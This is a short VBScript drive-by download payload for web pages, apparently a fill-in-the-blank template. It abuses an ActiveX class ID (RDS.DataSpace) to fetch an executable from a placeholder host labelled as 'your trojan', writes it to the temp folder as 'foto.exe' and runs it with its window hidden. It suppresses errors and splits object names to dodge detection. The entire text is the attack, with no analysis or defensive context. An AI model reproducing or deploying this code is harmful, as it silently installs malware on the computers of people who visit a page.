<script language="VBScript">
on error resume next

Set obj1 = document.createElement("object")
obj1.setAttribute "classid", "clsid:BD96C556-65A3-11D0-983A-00C04FC29E36"
est1="Microsoft."&"XMLHTTP"
Set obj2 = obj1.CreateObject(est1,"")


est="Ado"&"db."&"Str"&"eam"
set obj3 = obj1.createobject(est,"")
obj3.type = 1

est2="GET"
obj2.Open est2, "http://sitenizcom/trojanınız.exe", False
obj2.Send


set F = obj1.createobject("Scripting.FileSystemObject","")
set pasta = F.GetSpecialFolder(2)
fi="foto.exe"
fi= F.BuildPath(pasta,fi)


obj3.open
obj3.write obj2.responseBOdy 
obj3.savetofile fi,2
obj3.close


set obj5 = obj1.createobject("Shell.Application","")

obj5.ShellExecute fi,"","","open",0
</script>
